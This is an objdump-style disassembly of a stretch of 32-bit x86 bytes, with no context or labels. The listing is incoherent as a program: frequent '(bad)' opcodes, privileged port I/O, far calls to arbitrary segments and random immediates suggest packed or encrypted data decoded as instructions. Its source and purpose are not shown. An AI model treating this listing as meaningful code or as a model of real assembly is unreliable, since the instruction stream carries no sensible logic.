  4090fb:	add    BYTE PTR [ebp-0x19],bl
  4090fe:	xchg   DWORD PTR [ebp-0x75],edx
  409101:	cmp    dh,BYTE PTR cs:[edi-0x11458fe4]
  409108:	dec    eax
  409109:	jns    0x40912f
  40910b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40910c:	pop    esp
  40910d:	ins    DWORD PTR es:[edi],dx
  40910e:	lods   eax,DWORD PTR ds:[esi]
  40910f:	or     BYTE PTR [ecx+edi*2],dh
  409112:	outs   dx,BYTE PTR ds:[esi]
  409113:	or     esp,esi
  409115:	ret    
  409116:	outs   dx,BYTE PTR ds:[esi]
  409117:	or     eax,0xeb214a03
  40911c:	daa    
  40911d:	clc    
  40911e:	neg    ebp
  409120:	jno    0x4090e3
  409122:	and    eax,0x8d80e679
  409127:	push   0xfd9a1ebf
  40912c:	adc    al,0xcb
  40912e:	and    DWORD PTR [edx+0x3b6da12d],ebx
  409134:	mov    DWORD PTR [edi],eax
  409136:	test   eax,0x556c5415
  40913b:	pop    edx
  40913c:	or     ah,dh
  40913e:	test   BYTE PTR [edx-0x1a],ch
  409141:	dec    eax
  409142:	jmp    0x4091b5
  409144:	cmp    ebx,DWORD PTR [eax+0x19]
  409147:	cmp    al,0x4c
  409149:	aaa    
  40914a:	add    al,0xbe
  40914d:	pop    dx
  40914f:	cdq    
  409150:	and    DWORD PTR [ebx-0x68],ecx
  409153:	popw   ss
  409155:	ins    BYTE PTR es:[edi],dx
  409156:	mov    edi,DWORD PTR [edi]
  409158:	mov    dh,0x84
  40915a:	mov    dh,0x35
  40915c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40915d:	inc    edx
  40915e:	scas   al,BYTE PTR es:[edi]
  40915f:	jle    0x4091a6
  409161:	in     al,0xc
  409163:	mov    BYTE PTR [esi-0x7785c360],al
  409169:	cs mov bh,0xfc
  40916c:	mov    ecx,0x82898203
  409171:	dec    ebx
  409172:	es stos BYTE PTR es:[edi],al
  409174:	(bad)  
  409175:	pop    eax
  409176:	or     eax,0xf6451acb
  40917b:	mov    cl,0x6f
  40917d:	dec    ebx
  40917e:	xchg   ebp,eax
  40917f:	pop    ebp
  409180:	aam    0x3e
  409182:	push   esi
  409183:	jae    0x4091ff
  409185:	adc    eax,eax
  409187:	int    0x67
  409189:	inc    eax
  40918a:	jnp    0x409174
  40918c:	add    BYTE PTR ss:[edx+edx*2+0x5ceb364],ah
  409194:	ins    BYTE PTR es:[edi],dx
  409195:	mov    DWORD PTR [ebx],ecx
  409197:	scas   eax,DWORD PTR es:[edi]
  409198:	push   0x6826634a
  40919d:	cmp    DWORD PTR [ecx+0x9],esi
  4091a0:	sub    ecx,DWORD PTR [ecx+0xc]
  4091a3:	push   0x4d
  4091a5:	mov    eax,0x8c28aa5
  4091aa:	dec    edx
  4091ab:	(bad)  
  4091ac:	into   
  4091ad:	cmp    eax,0x52f0f6e4
  4091b2:	add    eax,0x4d374f26
  4091b7:	mov    ?,WORD PTR [ecx+0x77630404]
  4091bd:	repz retf 0x5096
  4091c1:	outs   dx,DWORD PTR ds:[esi]
  4091c2:	sti    
  4091c3:	push   ecx
  4091c4:	popa   
  4091c5:	mov    dl,0xbf
  4091c7:	dec    ebx
  4091c8:	test   DWORD PTR [edi],esi
  4091ca:	lock ins BYTE PTR es:[edi],dx
  4091cc:	mov    edi,0x714f805c
  4091d1:	dec    ebx
  4091d2:	cmovle esi,DWORD PTR [ebx+0x39b5ab71]
  4091d9:	fnstenv [edx+0x1691bcbd]
  4091df:	lods   al,BYTE PTR ds:[esi]
  4091e0:	scas   al,BYTE PTR es:[edi]
  4091e1:	jo     0x40918c
  4091e3:	lods   eax,DWORD PTR ds:[esi]
  4091e4:	imul   esi,DWORD PTR [edx-0x49ba7ee2],0x2
  4091eb:	dec    ebx
  4091ec:	fcmovu st,st(1)
  4091ee:	push   ebx
  4091ef:	pop    esp
  4091f0:	cli    
  4091f1:	mov    gs,WORD PTR [esi+eax*8+0x4f]
  4091f5:	cmp    eax,0xf423b07f
  4091fa:	int    0xae
  4091fc:	cmp    dh,dl
  4091fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091ff:	sub    edi,DWORD PTR [edi]
  409201:	dec    ecx
  409202:	pop    edi
  409203:	sub    al,0xf0
  409205:	test   eax,0xc6fac5db
  40920a:	mov    edx,0xbdcd7718
  40920f:	repnz aas 
  409211:	mov    gs,esp
  409213:	enter  0x6499,0xd6
  409217:	test   al,0x79
  409219:	popf   
  40921a:	cld    
  40921b:	adc    al,0x93
  40921d:	add    dl,bl
  40921f:	sub    eax,edx
  409221:	and    cl,BYTE PTR [eax]
  409223:	gs xchg ecx,eax
  409225:	das    
  409226:	cmp    BYTE PTR ds:0xfa7e10c9,bh
  40922c:	mov    BYTE PTR [ecx],dl
  40922e:	jmp    0xbed60232
  409233:	xchg   esp,eax
  409234:	inc    edx
  409235:	mov    esi,0x61bfc685
  40923a:	adc    al,0xe
  40923c:	scas   al,BYTE PTR es:[edi]
  40923d:	mov    ebp,0xfbd5b05f
  409242:	(bad)  [ecx]
  409244:	jno    0x4091ef
  409246:	(bad)  
  409247:	shl    esp,0x5b
  40924a:	dec    ebx
  40924b:	mov    dh,0x7d
  40924d:	dec    eax
  40924e:	loope  0x409236
  409250:	test   DWORD PTR [ebp+0x50],edx
  409253:	in     al,dx
  409254:	mov    ch,0xc
  409256:	mul    DWORD PTR [edi-0x565db217]
  40925c:	jg     0x409220
  40925e:	pop    es
  40925f:	es test eax,ecx
  409262:	ret    
  409263:	pop    esi
  409264:	inc    edi
  409265:	ret    0xea3c
  409268:	mov    ecx,ebp
  40926a:	mov    ecx,ecx
  40926c:	aaa    
  40926d:	xchg   edx,edi
  40926f:	sar    DWORD PTR [ecx],cl
  409271:	aad    0xcc
  409273:	fmul   DWORD PTR [ecx+edi*4]
  409276:	or     ah,BYTE PTR [esi]
  409278:	dec    eax
  409279:	pshufw mm0,QWORD PTR [esi-0x56ecc839],0x42
  409281:	push   ds
  409282:	cmp    eax,0xcd01aa55
  409287:	add    eax,0x67041322
  40928c:	jmp    0x8045:0xda4a1a39
  409293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409294:	dec    edx
  409295:	dec    esi
  409296:	ja     0x409254
  409298:	out    0x90,eax
  40929a:	in     eax,0xb2
  40929c:	nop
  40929d:	jmp    FWORD PTR ds:0x9f533ebc
  4092a3:	iret   
  4092a4:	jecxz  0x4092f0
  4092a6:	jl     0x4092a8
  4092a8:	push   esi
  4092a9:	inc    ecx
  4092aa:	dec    esi
  4092ab:	mov    WORD PTR [edx-0x38c223db],?
  4092b1:	mov    BYTE PTR [esi-0x4eddba24],ch
  4092b7:	mov    esp,0x37bcc8cf
  4092bc:	loop   0x4092a4
  4092be:	out    0x8b,eax
  4092c0:	pop    edx
  4092c1:	adc    al,0xdd
  4092c3:	sub    DWORD PTR [edi+0x4ed6bf7],0xffffffe0
  4092ca:	ror    DWORD PTR [eax+0x5c91ea64],cl
  4092d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092d1:	popf   
  4092d2:	xor    esp,DWORD PTR [esi]
  4092d4:	dec    edi
  4092d5:	mov    ebx,0x19cc351b
  4092da:	inc    ebx
  4092db:	pop    edx
  4092dc:	inc    ebp
  4092dd:	test   ebp,esp
  4092df:	xchg   ebx,eax
  4092e0:	loopne 0x4092a9
  4092e2:	sbb    DWORD PTR [edi+0x7f],ecx
  4092e5:	dec    esi
  4092e6:	sti    
  4092e7:	push   esp
  4092e8:	sub    esp,ebx
  4092ea:	jae    0x409293
  4092ec:	jl     0x409329
  4092ee:	xor    al,0x1e
  4092f0:	pusha  
  4092f1:	dec    ecx
  4092f2:	loopne 0x4092ed
  4092f4:	(bad)  
  4092f5:	mov    cl,0x16
  4092f7:	mov    ds:0xcf0c9dc6,eax
  4092fc:	pop    esp
  4092fd:	mov    bl,0xd6
  4092ff:	xchg   esp,edx
  409301:	mov    ds:0xedc57f26,eax
  409306:	popa   
  409307:	sbb    DWORD PTR [edi-0x67],0x73463df2
  40930e:	sbb    al,0x72
  409310:	sbb    ecx,esp
  409312:	ror    DWORD PTR [eax-0x7d1aaf84],1
  409318:	ret    
  409319:	dec    eax
  40931a:	dec    eax
  40931b:	loopne 0x409311
  40931d:	xchg   edx,eax
  40931e:	sbb    DWORD PTR [edx],ebx
  409320:	dec    edx
  409321:	fidiv  WORD PTR [ebx]
  409323:	push   ebx
  409324:	retf   
  409325:	adc    dh,dl
  409327:	fsubr  QWORD PTR [ecx]
  409329:	test   eax,0xcaf5b1e0
  40932e:	fs (bad) 
  409330:	cwde   
  409331:	dec    edi
  409332:	sbb    dl,bh
  409334:	cmp    ebp,DWORD PTR [ebp+0x3a]
  409337:	sub    al,0x3
  409339:	stos   BYTE PTR es:[edi],al
  40933a:	das    
  40933b:	loopne 0x4093b8
  40933d:	pusha  
  40933e:	bound  edx,QWORD PTR [edx-0x26]
  409341:	(bad)  
  409343:	mov    edx,0x10762e06
  409348:	cwde   
  409349:	xchg   cl,ch
  40934b:	lahf   
  40934c:	stc    
  40934d:	cmc    
  40934e:	sahf   
  40934f:	cmp    ebp,ebx
  409351:	cwde   
  409352:	push   esi
  409353:	mov    ch,0xd7
  409355:	inc    esi
  409356:	hlt    
  409357:	xor    eax,0x7093b09b
  40935c:	inc    edi
  40935d:	mov    dh,0x30
  40935f:	push   ebp
  409360:	test   bh,al
  409362:	je     0x409398
  409364:	mov    dl,0xf0
  409366:	ins    BYTE PTR es:[edi],dx
  409367:	xchg   ebx,eax
  409368:	scas   al,BYTE PTR es:[edi]
  409369:	sahf   
  40936a:	lea    esp,[esi]
  40936c:	and    al,0x19
  40936e:	dec    eax
  40936f:	clc    
  409370:	lock das 
  409372:	pop    eax
  409373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409374:	into   
  409375:	sti    
  409376:	test   al,0xa8
  409378:	xchg   ecx,eax
  409379:	cmp    ecx,esp
  40937b:	rol    edx,1
  40937d:	pop    ds
  40937e:	push   0x21ddcf93
  409383:	jg     0x4093f5
  409385:	add    dh,BYTE PTR [edi]
  409387:	jp     0x409322
  409389:	in     al,0xd9
  40938b:	arpl   ax,di
  40938d:	sub    eax,0x45b85983
  409392:	int    0x57
  409394:	inc    esp
  409395:	lahf   
  409396:	jb     0x409414
  409398:	push   es
  409399:	fstp   DWORD PTR [edi+0x3b]
  40939c:	push   ebp
  40939d:	push   edi
  40939e:	sbb    esp,DWORD PTR [ecx+0x16]
  4093a1:	(bad)  
  4093a3:	lods   al,BYTE PTR ds:[esi]
  4093a4:	inc    ecx
  4093a5:	fbld   TBYTE PTR [edi+0x6a]
  4093a8:	test   BYTE PTR [ebp+ecx*1-0x4b],bl
  4093ac:	xchg   esp,eax
  4093ad:	leave  
  4093ae:	cmp    dl,0xbc
  4093b1:	cmp    dh,BYTE PTR [edx]
  4093b3:	dec    ecx
  4093b4:	inc    ecx
  4093b5:	adc    al,0xde
  4093b7:	retf   
  4093b8:	out    dx,al
  4093b9:	cmp    dh,dl
  4093bb:	stos   BYTE PTR es:[edi],al
  4093bc:	xor    al,0x99
  4093be:	test   DWORD PTR ds:0xb73d01c5,eax
  4093c4:	mov    es,ebp
  4093c6:	mov    eax,ds:0x10806001
  4093cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093cc:	cdq    
  4093cd:	clc    
  4093ce:	add    bl,BYTE PTR es:[esi+eax*1+0x6a]
  4093d3:	(bad)  
  4093d4:	jge    0x4093e0
  4093d6:	inc    esi
  4093d7:	add    al,0x71
  4093d9:	sti    
  4093da:	dec    edx
  4093db:	call   0x7983:0xc9087c16
  4093e2:	mov    ebp,0x11eee952
  4093e7:	aad    0x32
  4093e9:	js     0x4093f9
  4093eb:	xlat   BYTE PTR ds:[ebx]
  4093ec:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4093ee:	inc    edi
  4093ef:	dec    esp
  4093f0:	and    DWORD PTR ds:0x7cc91096,esp
  4093f6:	aam    0x65
  4093f8:	xchg   esi,eax
  4093f9:	cmp    DWORD PTR ds:0x5edd9a52,0xd776c062
  409403:	out    0x5f,al
  409405:	xlat   BYTE PTR ds:[ebx]
  409406:	cs inc ebx
  409408:	cmp    DWORD PTR [ecx+0x59891390],ebp
  40940e:	js     0x409430
  409410:	out    dx,al
  409411:	fwait
  409412:	adc    ebp,DWORD PTR [ebx]
  409414:	mov    cl,0xde
  409416:	aas    
  409417:	scas   eax,DWORD PTR es:[edi]
  409418:	dec    ecx
  409419:	mov    al,0x16
  40941b:	jns    0x409424
  40941d:	iret   
  40941e:	imul   ebp,DWORD PTR [ecx],0xa8972f6a
  409424:	hlt    
  409425:	sub    dh,BYTE PTR [eax-0x143ca5ba]
  40942b:	call   0xd96b:0x7cd1a94b
  409432:	cmp    edi,edx
  409434:	and    al,ah
  409436:	loop   0x4093fc
  409438:	pop    ebx
  409439:	xchg   esp,eax
  40943a:	rcr    BYTE PTR [ecx+0x60121611],0x59
  409441:	aaa    
  409442:	aaa    
  409443:	jns    0x4094c4
  409445:	push   eax
  409446:	jle    0x409455
  409448:	dec    ebp
  409449:	sub    al,0x58
  40944b:	out    0x15,eax
  40944d:	pushf  
  40944e:	xor    dh,dl
  409450:	in     eax,dx
  409451:	aas    
  409452:	call   0xe5ab:0x4f13dc3b
  409459:	pop    eax
  40945a:	inc    ebx
  40945b:	push   ss
  40945c:	retf   
  40945d:	and    eax,0xcad1ecbc
  409462:	dec    esp
  409463:	xlat   BYTE PTR ds:[ebx]
  409464:	push   ebp
  409465:	xor    DWORD PTR [ebx-0x2723f028],esp
  40946b:	push   es
  40946c:	hlt    
  40946d:	cmp    BYTE PTR [edi],cl
  40946f:	jmp    0x4094a0
  409471:	(bad)  
  409472:	pop    ecx
  409473:	repz fs das 
  409476:	add    ebp,esp
  409478:	add    DWORD PTR [edi+0xf],eax
  40947b:	mov    ebp,0x956c0983
  409480:	aad    0x8f
  409482:	jp     0x409408
  409484:	xor    BYTE PTR [eax+edx*8+0x41f173c4],bh
  40948b:	shl    DWORD PTR [edx+0xf470506],cl
  409491:	dec    esi
  409492:	xchg   ebp,eax
  409493:	dec    esp
  409494:	iret   
  409495:	call   0x109e:0x96d0c7f
  40949c:	(bad)  
  40949d:	scas   al,BYTE PTR es:[edi]
  40949e:	iret   
  40949f:	xchg   DWORD PTR [ecx-0x37],ecx
  4094a2:	dec    edi
  4094a3:	xchg   esp,eax
  4094a4:	ds ins DWORD PTR es:[edi],dx
  4094a6:	mov    esp,0x123d1a6c
  4094ab:	arpl   di,cx
  4094ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094ae:	sub    DWORD PTR [eax+eiz*4-0x5e15f62b],ecx
  4094b5:	je     0x409451
  4094b7:	btr    ebp,0x26
  4094bb:	xchg   ebx,eax
  4094bc:	cwde   
  4094bd:	lea    esp,[ebx]
  4094bf:	mov    ds:0xc2d6784a,eax
  4094c4:	mov    edi,edi
  4094c6:	imul   esi,DWORD PTR [ebp+0xb],0x5413055c
  4094cd:	lods   eax,DWORD PTR ds:[esi]
  4094ce:	addr16 sbb al,0xe6
  4094d1:	adc    ebp,DWORD PTR [eax+0x616cec95]
  4094d7:	xchg   esp,eax
  4094d8:	dec    edx
  4094d9:	mov    al,0xb5
  4094db:	in     al,0xd1
  4094dd:	dec    edx
  4094de:	outs   dx,DWORD PTR ds:[esi]
  4094df:	in     al,dx
  4094e0:	mov    cl,0xb6
  4094e2:	iret   
  4094e3:	ins    DWORD PTR es:[edi],dx
  4094e4:	add    BYTE PTR [esi-0x105ef6fc],ch
  4094ea:	and    esi,DWORD PTR [ecx+eax*1+0x4b07b63b]
  4094f1:	jecxz  0x409546
  4094f3:	adc    eax,edi
  4094f5:	or     ecx,0xea502ce
  4094fb:	in     eax,0x28
  4094fd:	xchg   DWORD PTR [ecx-0x52],esi
  409500:	sub    al,0x34
  409502:	fild   DWORD PTR [edx+0x27]
  409505:	push   0x47a6e3a8
  40950a:	mov    edx,0x8ad85263
  40950f:	push   ds
  409510:	sbb    edi,DWORD PTR [esi-0xe]
  409513:	pop    eax
  409514:	cdq    
  409515:	xchg   edi,eax
  409516:	mov    es,WORD PTR es:[ecx-0x534830a9]
  40951d:	(bad)  
  40951e:	mov    al,ds:0x51a2afd9
  409523:	fwait
  409524:	sahf   
  409525:	jge    0x4095a6
  409527:	push   0xff4696e9
  40952c:	jge    0x409567
  40952e:	aad    0xb5
  409530:	mov    ds:0xf37596e4,eax
  409535:	mov    bh,0xfa
  409537:	push   esi
  409538:	test   ecx,0xe09eb6aa
  40953e:	mov    cl,0x2d
  409540:	or     ebx,DWORD PTR [edx+0x2bfac932]
  409546:	in     eax,0xc5
  409548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409549:	lods   eax,DWORD PTR ds:[esi]
  40954a:	push   eax
  40954b:	ror    DWORD PTR [eax+0x68],0x56
  40954f:	cmp    DWORD PTR [edx+0xc],ecx
  409552:	mov    esi,0xbbf2da69
  409557:	push   eax
  409558:	cdq    
  409559:	call   DWORD PTR [edx-0x45]
  40955c:	std    
  40955d:	sub    edi,esp
  40955f:	pop    esp
  409560:	mov    bl,0xd2
  409562:	push   ecx
  409563:	mov    ebp,0xfafaf8b3
  409568:	inc    esi
  409569:	iret   
  40956a:	sbb    eax,edx
  40956c:	or     DWORD PTR [ecx+0x44b1c1a5],0x49
  409573:	xchg   edi,eax
  409574:	mov    esi,0x21afc86a
  409579:	push   ebp
  40957a:	mov    ch,ah
  40957c:	ret    0xfff2
  40957f:	fcomp  QWORD PTR ds:0x5b637c8
  409585:	mov    es,esi
  409587:	hlt    
  409588:	repnz arpl WORD PTR [ebp+0x7a76d53c],si
  40958f:	pxor   mm2,mm3
  409592:	push   0x6b
  409594:	lods   al,BYTE PTR ds:[esi]
  409595:	push   ds
  409596:	xor    BYTE PTR [edi-0x7b],0x78
  40959a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40959b:	push   es
  40959c:	jns    0x40960b
  40959e:	jbe    0x409604
  4095a0:	sub    eax,0xd0d1cca6
  4095a5:	adc    al,0x30
  4095a7:	xchg   esi,eax
  4095a8:	dec    eax
  4095a9:	stos   BYTE PTR es:[edi],al
  4095aa:	jo     0x40958a
  4095ac:	fsubr  DWORD PTR [edx]
  4095ae:	or     bl,cl
  4095b0:	or     ch,BYTE PTR [esi-0x702c619c]
  4095b6:	inc    esp
  4095b7:	leave  
  4095b8:	xchg   edi,eax
  4095b9:	out    dx,al
  4095ba:	stos   BYTE PTR es:[edi],al
  4095bb:	in     eax,dx
  4095bc:	and    bl,ah
  4095be:	jno    0x4095bc
  4095c0:	arpl   WORD PTR [eax-0x62],ax
  4095c3:	adc    eax,0x28fdff63
  4095c8:	add    edx,DWORD PTR [ebx-0xa]
  4095cb:	mov    bl,0x54
  4095cd:	imul   eax,DWORD PTR [ebp-0x2f],0xf287bc3f
  4095d4:	jo     0x409621
  4095d6:	retf   0x92e7
  4095d9:	add    esp,eax
  4095db:	lds    ebp,FWORD PTR [ebp-0x46]
  4095de:	xor    ah,cl
  4095e0:	cs pusha 
  4095e2:	sbb    BYTE PTR [edx+0x73],bl
  4095e5:	ds test al,0xf6
  4095e8:	scas   al,BYTE PTR es:[edi]
  4095e9:	adc    eax,DWORD PTR [ebx+0x23]
  4095ec:	je     0x409612
  4095ee:	out    0xf7,eax
  4095f0:	mov    eax,ds:0x33def658
  4095f5:	mov    eax,0x6fe6b8c
  4095fa:	push   edx
  4095fb:	loop   0x409590
  4095fd:	or     al,0xdb
  4095ff:	leave  
  409600:	and    al,0x21
  409602:	xor    edi,esp
  409604:	lods   al,BYTE PTR ds:[si]
  409606:	cmp    ebx,DWORD PTR [ecx]
  409608:	inc    ebp
  409609:	dec    esp
  40960a:	aad    0x8d
  40960c:	xchg   esi,eax
  40960d:	push   ecx
  40960e:	daa    
  40960f:	mov    dl,0x30
  409611:	sub    eax,0xae6c7c37
  409616:	xor    BYTE PTR [eax],ch
  409618:	xchg   edi,eax
  409619:	ror    BYTE PTR [edx+edi*4-0x752d363a],0x38
  409621:	dec    ebx
  409622:	mov    esp,0x165e9b45
  409627:	or     BYTE PTR [ebx],al
  409629:	lock ins DWORD PTR es:[edi],dx
  40962b:	xchg   esp,eax
  40962c:	lods   eax,DWORD PTR ds:[esi]
  40962d:	dec    esp
  40962e:	push   esi
  40962f:	mov    ecx,0x20dc8ed9
  409634:	add    DWORD PTR [ecx],ecx
  409636:	gs add ebp,esp
  409639:	loope  0x40964e
  40963b:	mov    eax,ds:0xe6179eba
  409640:	out    0x2b,al
  409642:	add    eax,0x5949f111
  409647:	inc    ecx
  409648:	jbe    0x40968e
  40964a:	loop   0x4096bb
  40964c:	add    al,0xb7
  40964e:	pop    ecx
  40964f:	xlat   BYTE PTR ds:[ebx]
  409650:	xor    ebp,DWORD PTR [edi-0x41]
  409653:	xchg   ecx,eax
  409654:	xchg   esp,eax
  409655:	mov    DWORD PTR [ebp+0xc],ecx
  409658:	or     eax,0x70ccc367
  40965d:	cmp    dh,BYTE PTR [ebx-0x48]
  409660:	jge    0x409666
  409662:	jg     0x409625
  409664:	pop    ds
  409665:	test   al,0x7
  409667:	in     al,dx
  409668:	gs push eax
  40966a:	jle    0x409699
  40966c:	push   ecx
  40966d:	pop    ss
  40966e:	cs jg  0x40967b
  409671:	inc    eax
  409672:	out    0xc8,al
  409674:	jp     0x4096be
  409676:	and    BYTE PTR [ecx+eiz*4-0x662e447c],0xa5
  40967e:	lea    ebx,[edx]
  409680:	and    DWORD PTR [edi-0x23],0x9197e84b
  409687:	scas   eax,DWORD PTR es:[edi]
  409688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409689:	mov    esi,0x80b7bf2a
  40968e:	call   0xe42b:0x1a59bd81
  409695:	out    0x3d,eax
  409697:	loop   0x40970f
  409699:	test   eax,0xbb2439f5
  40969e:	icebp  
  40969f:	lds    edi,FWORD PTR [edi-0x4b953b5b]
  4096a5:	mov    edx,0xb31da42a
  4096aa:	scas   eax,DWORD PTR es:[edi]
  4096ab:	gs pusha 
  4096ad:	hlt    
  4096ae:	xor    al,0x6
  4096b0:	call   0xd3f6591c
  4096b5:	arpl   WORD PTR [ecx-0x12112127],bp
  4096bb:	inc    esp
  4096bc:	shr    BYTE PTR [eax],0x77
  4096bf:	mov    esp,0xf9260371
  4096c4:	shr    BYTE PTR [edx-0x77],1
  4096c7:	ins    BYTE PTR es:[edi],dx
  4096c8:	jb     0x409723
  4096ca:	stos   BYTE PTR es:[edi],al
  4096cb:	cmc    
  4096cc:	push   0xffffff94
  4096ce:	mov    ecx,0x81d1887f
  4096d3:	jne    0x409731
  4096d5:	mov    cl,0x5c
  4096d7:	mov    BYTE PTR [edi+0x42],al
  4096da:	or     BYTE PTR [eax+0x17b93a5d],dh
  4096e0:	xor    edx,DWORD PTR [ebx-0x49]
  4096e3:	imul   edi,edi,0x67
  4096e6:	rcl    BYTE PTR [ebp+0xe],0x5e
  4096ea:	push   es
  4096eb:	stos   BYTE PTR es:[edi],al
  4096ec:	dec    edx
  4096ed:	ins    DWORD PTR es:[edi],dx
  4096ee:	lock dec ebp
  4096f0:	mov    eax,0x553a1e69
  4096f5:	popa   
  4096f6:	psubw  mm4,QWORD PTR [edi-0x54]
  4096fa:	dec    BYTE PTR [edi]
  4096fc:	lahf   
  4096fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096fe:	cli    
  4096ff:	or     BYTE PTR ds:0xa74ef00,dl
  409705:	cli    
  409706:	cmp    eax,0x7b6e9015
  40970b:	outs   dx,BYTE PTR ds:[esi]
  40970c:	outs   dx,BYTE PTR ds:[esi]
  40970d:	pop    ss
  40970e:	cmp    al,0x3b
  409710:	jmp    0x4096d8
  409712:	xlat   BYTE PTR ds:[ebx]
  409713:	mov    BYTE PTR [edi],cl
  409715:	push   edi
  409716:	enter  0x8357,0xd
  40971a:	loopne 0x409780
  40971c:	jo     0x409728
  40971e:	inc    edi
  40971f:	int    0x2d
  409721:	cli    
  409722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409723:	add    al,0xc
  409725:	cmp    BYTE PTR [ebx+0x5c],bh
  409728:	sbb    eax,0x9f57d876
  40972d:	or     DWORD PTR [ebx],edx
  40972f:	call   0x6dd9:0xef072f11
  409736:	add    al,0x72
  409738:	adc    esi,DWORD PTR [edi]
  40973a:	and    BYTE PTR [esi],bl
  40973c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40973d:	mov    ds:0x715b5382,eax
  409742:	xchg   edi,eax
  409743:	push   ebx
  409744:	es xchg ebx,eax
  409746:	les    ebp,FWORD PTR [ecx+0xed09acf]
  40974c:	das    
  40974d:	test   al,0x82
  40974f:	daa    
  409750:	inc    ebp
  409751:	pop    esp
  409752:	dec    edx
  409753:	rcl    BYTE PTR fs:[edi-0x1cee4987],0x1e
  40975b:	dec    edx
  40975c:	lods   al,BYTE PTR ds:[esi]
  40975d:	imul   edi,DWORD PTR [esi+0x6c],0xba565eba
  409764:	adc    eax,esi
  409766:	adc    bl,bl
  409768:	(bad)  
  409769:	hlt    
  40976a:	and    DWORD PTR [ebp-0x1b],esi
  40976d:	inc    edx
  40976e:	aam    0xf0
  409770:	(bad)  
  409771:	cmp    eax,0xa852d5f0
  409776:	ret    0xa78b
  409779:	das    
  40977a:	clc    
  40977b:	rol    ch,cl
  40977d:	mov    edx,DWORD PTR [ecx+0x246c22de]
  409783:	js     0x4097f3
  409785:	aam    0x7f
  409787:	imul   eax,edx,0x4a
  40978a:	fidivr WORD PTR [ebx-0x712043a8]
  409790:	xchg   edx,eax
  409791:	lods   al,BYTE PTR ds:[esi]
  409792:	lock mov ecx,0x5fcdc122
  409798:	retf   0x183c
  40979b:	rcr    DWORD PTR [ecx+0x61eb8629],1
  4097a1:	jge    0x40979c
  4097a3:	(bad)  
  4097a5:	aam    0xd3
  4097a7:	lods   al,BYTE PTR ds:[si]
  4097a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097aa:	(bad)  
  4097ab:	mov    al,0x41
  4097ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097ae:	sub    DWORD PTR [edx-0x37],ebx
  4097b1:	daa    
  4097b2:	data16 sti 
  4097b4:	shl    BYTE PTR [esi],1
  4097b6:	ret    0xe05c
  4097b9:	ins    DWORD PTR es:[edi],dx
  4097ba:	sbb    DWORD PTR [esi-0x4926bf44],edi
  4097c0:	dec    DWORD PTR [esi]
  4097c2:	jnp    0x409794
  4097c4:	dec    ebx
  4097c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097c6:	and    al,0x84
  4097c8:	int3   
  4097c9:	inc    edx
  4097ca:	ds ins DWORD PTR es:[edi],dx
  4097cc:	sub    DWORD PTR [ebp+0x1f9d85b],ebp
  4097d2:	sahf   
  4097d3:	dec    ebp
  4097d4:	xchg   esp,eax
  4097d5:	or     dh,BYTE PTR [esi+0x1009f13a]
  4097db:	pop    ecx
  4097dc:	inc    edx
  4097de:	mov    DWORD PTR [edi],esi
  4097e0:	mov    WORD PTR [ebx],cs
  4097e2:	lods   al,BYTE PTR ds:[esi]
  4097e3:	and    ch,ch
  4097e5:	stos   DWORD PTR es:[edi],eax
  4097e6:	dec    edi
  4097e7:	inc    edx
  4097e8:	in     eax,0x2d
  4097ea:	or     al,0x6b
  4097ec:	into   
  4097ed:	jmp    0x1560558c
  4097f2:	xchg   ebx,eax
  4097f3:	adc    ebx,DWORD PTR ss:[eax-0x1c675f91]
  4097fa:	add    eax,0x675f15eb
  4097ff:	xor    ch,BYTE PTR [ecx]
  409801:	fwait
  409802:	jae    0x40983c
  409804:	xchg   ebx,eax
  409805:	cmc    
  409806:	cmp    ebp,ecx
  409808:	mov    dh,bh
  40980a:	xchg   edx,eax
  40980b:	pop    ebx
  40980c:	test   BYTE PTR [edi],bh
  40980e:	ret    0x9ce7
  409811:	mov    ebx,0x522d9040
  409816:	mov    cl,0x6f
  409818:	fmul   DWORD PTR [eax+0x410f86dd]
  40981e:	push   ecx
  40981f:	call   0x4ab74f5a
  409824:	pop    eax
  409825:	sbb    DWORD PTR [esi-0x38],esp
  409828:	ds das 
  40982a:	paddusb mm6,QWORD PTR [ebx+0x3a]
  40982e:	popf   
  40982f:	(bad)  
  409830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409831:	xor    al,0x7
  409833:	in     eax,0xc3
  409835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409836:	loope  0x40981d
  409838:	ret    0xaf25
  40983b:	in     al,0x65
  40983d:	fist   DWORD PTR [ecx-0x1]
  409840:	aad    0xb7
  409842:	sahf   
  409843:	jge    0x40988e
  409845:	jnp    0x409837
  409847:	push   ds
  409848:	fidiv  WORD PTR [eax+ecx*1-0x46]
  40984c:	or     eax,0xf633d927
  409851:	lea    esi,[edx]
  409853:	jne    0x409884
  409855:	cmp    DWORD PTR [ebp-0x324947b9],ebx
  40985b:	lods   eax,DWORD PTR ds:[esi]
  40985c:	or     dh,BYTE PTR [edx]
  40985e:	int    0xcc
  409860:	and    DWORD PTR [ebx+ecx*4+0x2e],esp
  409864:	sbb    ebp,ecx
  409866:	push   ecx
  409867:	popa   
  409868:	mov    dh,0x51
  40986a:	or     eax,0xf2e4a11d
  40986f:	aaa    
  409870:	adc    edx,edx
  409872:	push   edi
  409873:	shr    BYTE PTR [esp+edx*4],1
  409876:	mov    esp,0xb0e88042
  40987b:	xor    ebx,ebp
  40987d:	add    ch,BYTE PTR [edx]
